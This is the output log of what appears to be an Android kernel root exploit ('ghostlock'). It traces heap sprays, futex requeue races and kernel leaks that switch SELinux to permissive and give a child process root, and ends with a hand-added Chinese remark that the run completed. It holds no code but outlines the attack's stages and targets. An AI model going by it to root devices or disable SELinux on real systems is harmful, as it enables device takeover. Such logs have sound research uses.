[*] cpu pair: main=3 consumer=4
[*] runtime home=/data/local/tmp/ghostlock-app script=/data/local/tmp/ghostlock-app/.ghostlock_root.sh
[*] kernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] no external offsets match at /data/local/tmp/ghostlock-app/offsets.json
[+] offsets matched: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] soc: qcom/other; kernel_phys_load=0xa8000000
[*] init_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[+] startup context pid=15285 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[+] startup limits pid=15285 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[+] build config pid=15285 label=ghostlock_oplus slide=pselect main=pselect
[+] p0 profile pid=15285 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[*] p0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[*] main thread running on cpu=3
[*] [T+0ms] exploit start
[*] [T+0ms] pre-W1 drain
[*] W1: SELinux attempt 1/1
[*] === W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[*] [T+36ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +82ms
[*] [spray] finding futex collisions... +165ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +868ms
[*] [spray] mm_struct leaked=0xffffff891d48ec00 +902ms
[*] [spray] payload ready +903ms
[*] prepare_kernel_page ok attempt=1 +954ms
[*] [T+991ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=4
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+2995ms]   PI route done
[+] SELinux permissive
[*] W1b: private scratch repair attempt 1/3
[*] === W1b: private scratch repair === target=0xffffff891d488108 mode=1 leaf=1
[*] [T+3095ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +100ms
[*] [spray] finding futex collisions... +192ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +944ms
[*] [spray] mm_struct leaked=0xffffff88fba28400 +1137ms
[*] [spray] payload ready +1139ms
[*] prepare_kernel_page ok attempt=1 +1205ms
[*] [T+4301ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=4
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+6305ms]   PI route done
[+] private scratch repaired; releasing quarantine
[*] [T+6305ms] Write 1 complete
[*] [T+6349ms] pre-W2 drain
[*] perf task: 0xffffff80070fb600 (171/256 votes)
[*] perf task: 0xffffff80070fb600 (169/256 votes)
[*] [T+6843ms] perf_find_task done
[*] child_pid=20619 child_task=0xffffff80070fb600
[*] vr.ko not loaded; skipping tag clear
[*] W2: cred attempt 1/15
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +95ms
[*] [spray] finding futex collisions... +191ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +896ms
[*] [spray] mm_struct leaked=0xffffff88fb6a3400 +1073ms
[*] [spray] payload ready +1074ms
[*] prepare_kernel_page ok attempt=1 +1136ms
[*] W2 fast repair payload prebuilt
[*] === W2: cred === target=0xffffff80070fbd98 mode=2 leaf=0
[*] [T+8021ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +97ms
[*] [spray] finding futex collisions... +193ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +896ms
[*] [spray] mm_struct leaked=0xffffff88aabec800 +1057ms
[*] [spray] payload ready +1058ms
[*] prepare_kernel_page ok attempt=1 +1120ms
[*] [T+9142ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=4
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+11145ms]   PI route done
[*] W2b: firing prebuilt init_cred+8 repair
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=4
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] child uid = 0
[+] child is root!
[+] no app seccomp filter (adb/shell flow); skipping W3

//手动添加：目视最后一行为exploit complete